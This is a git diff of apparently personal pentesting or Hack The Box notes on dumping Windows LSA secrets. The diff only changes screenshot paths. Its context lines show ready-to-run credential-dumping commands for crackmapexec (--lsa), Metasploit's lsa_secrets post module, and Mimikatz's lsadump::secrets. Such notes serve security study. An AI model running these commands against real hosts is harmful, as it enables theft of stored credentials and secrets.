@@ -22,7 +22,7 @@ Adversaries with SYSTEM access to a host may attempt to access Local Security Au
 crackmapexec smb '10.10.10.100' -u 'moe' -p 'Password123' --lsa
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221312.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221312.png)
 
 ### Metasploit
 
@@ -30,7 +30,7 @@ crackmapexec smb '10.10.10.100' -u 'moe' -p 'Password123' --lsa
 use post/windows/gather/lsa_secrets
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221319.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221319.png)
 
 ### Mimikatz
 
@@ -38,4 +38,4 @@ use post/windows/gather/lsa_secrets
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 ```
 
-![](../../../Assets/Pasted%20image%2020250619221325.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619221325.png)
